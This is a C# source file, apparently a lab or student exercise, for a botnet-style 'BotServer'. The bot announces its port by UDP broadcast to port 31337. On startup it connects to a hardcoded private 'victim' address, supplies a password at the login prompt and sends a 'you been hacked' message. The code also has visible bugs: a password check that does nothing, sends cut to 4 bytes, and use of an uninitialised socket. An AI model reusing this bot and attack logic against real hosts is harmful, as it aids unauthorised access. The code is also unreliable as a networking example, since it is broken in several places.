using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace bot
{

    class BotServer
    {
        private String hacked_message = "you been hacked by hadas!";
        private int listening_port;
        private static System.Timers.Timer timer;
        private IPAddress brodcast = IPAddress.Parse("255.255.255.255");
        UdpClient listener;
        IPEndPoint localEndPoint;
        Socket udp_socket;

        public BotServer()
        {
            //initial();
            attack("172.16.16.110",2019,"passssap");
        }

        public void initial()
        {
            //initial
            Random random = new Random();
            listening_port = random.Next(1000, 9999);
            Console.Write(listening_port);//for fun
            //timer - bot announcement
            int sec = 1000;
            int num_of_sec = 10;
            System.Timers.Timer timer = new System.Timers.Timer(sec * num_of_sec);
            timer.Elapsed += bot_announcement;
            timer.Enabled = true;

            
        }
    
        public void listening_to_bot()
        {
            bool done = false;
            listener = new UdpClient(listening_port);
            localEndPoint = new IPEndPoint(IPAddress.Parse("172.16.15.50"), listening_port);
            udp_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            string received_data;
            byte[] receive_byte_array;
            try
            {
                while (!done)
                {
                    Console.WriteLine("Waiting for broadcast");
                    receive_byte_array = listener.Receive(ref localEndPoint);
                    Console.WriteLine("Received a broadcast from {0}", localEndPoint.ToString());
                    received_data = Encoding.ASCII.GetString(receive_byte_array, 0, receive_byte_array.Length);
                    Console.WriteLine("data follows \n{0}\n\n", received_data);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            listener.Close();
        }

        public void bot_announcement(Object source, System.Timers.ElapsedEventArgs e)
        {
            IPEndPoint ipep = new IPEndPoint(brodcast, 31337);
            udp_socket.Connect(ipep);
            String port = listening_port.ToString();
            byte[] buffer = Encoding.ASCII.GetBytes(port);
            udp_socket.Send(buffer, 4, SocketFlags.None);
        }

        private string receive(Socket client,int msg_size)
        {
            byte[] rcv_buffer = new byte[msg_size];
            int readBytes = client.Receive(rcv_buffer, msg_size, SocketFlags.None);
            if (readBytes == 0)
            {
                int i = 10;   
            }
            return System.Text.Encoding.Default.GetString(rcv_buffer);
        }

        public void attack(string ip, int port,string pass)
        {
            IPAddress victimAddress = IPAddress.Parse(ip);
            IPEndPoint ipep = new IPEndPoint(victimAddress, port);
            Socket server = new Socket(AddressFamily.InterNetwork,SocketType.Stream, ProtocolType.Tcp);
            server.Connect(ipep);
            //Socket server = socket.Accept();
            string response = receive(server,100);
            int index = response.IndexOf("\r\n");
            // check if the input is ok
            if (index > -1) {
                response = response.Substring(0, index);
                if (String.Equals(response, "Please enter your password", StringComparison.OrdinalIgnoreCase)) ;
                byte[] buffer = Encoding.ASCII.GetBytes(pass + "\r\n");
                server.Send(buffer, pass.Length + "\r\n".Length, SocketFlags.None);
                try {
                    response = receive(server, 100);
                    buffer = Encoding.ASCII.GetBytes(hacked_message);
                    server.Send(buffer, 4, SocketFlags.None);
                }

                catch (Exception e) { }
            }
        }

    }
}
